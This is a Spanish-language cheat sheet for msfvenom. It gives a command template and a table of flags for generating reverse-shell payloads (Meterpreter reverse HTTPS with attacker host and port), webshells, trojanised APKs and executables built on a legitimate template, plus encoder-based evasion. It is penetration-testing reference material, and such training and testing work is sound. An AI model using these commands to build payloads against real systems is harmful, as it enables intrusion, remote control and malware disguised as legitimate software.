```
msfvenom -p [payload] [LHOST=ip] [LPORT=puerto] [opciones] -f [formato] -o [archivo]
```

| **Flag**                         | **Función**                          | **Ejemplo**                                    |
| ---------------------------- | -------------------------------- | ------------------------------------------ |
| `-p`                         | Payload principal                | `-p windows/x64/meterpreter_reverse_https` |
| `LHOST`                      | IP atacante                      | `LHOST=10.10.10.5`                         |
| `LPORT`                      | Puerto atacante                  | `LPORT=443`                                |
| `RHOST`                      | IP víctima (bind)                | `RHOST=192.168.1.100`                      |
| `-f exe`                     | Formato Windows exe              | `-f exe -o shell.exe`                      |
| `-f elf`                     | Formato Linux                    | `-f elf -o shell.elf`                      |
| `-f apk`                     | Formato Android                  | `-f apk -o evil.apk`                       |
| `-f war`                     | Formato Java WAR                 | `-f war -o evil.war`                       |
| `-f asp` / `-f php`          | Webshells                        | `-f php -o shell.php`                      |
| `-f psh-cmd`                 | PowerShell one-liner             | `-f psh-cmd`                               |
| `-e`                         | Encoder                          | `-e x64/shikata_ga_nai`                    |
| `-i`                         | Iteraciones encoder              | `-i 15`                                    |
| `-b`                         | Badchars a evitar                | `-b "\x00\x0a\x0d\x20"`                    |
| `-a`                         | Arquitectura                     | `-a x64 --platform windows`                |
| `-x`                         | Plantilla (exe legítimo)         | `-x legitimate.exe`                        |
| `-k`                         | Mantener funcionalidad plantilla | `-k`                                       |
| `--list payloads`            | Listar payloads                  | `--list payloads \| grep reverse`          |
| `DisablePayloadHandler=True` | No levanta handler automático    | `DisablePayloadHandler=True`               |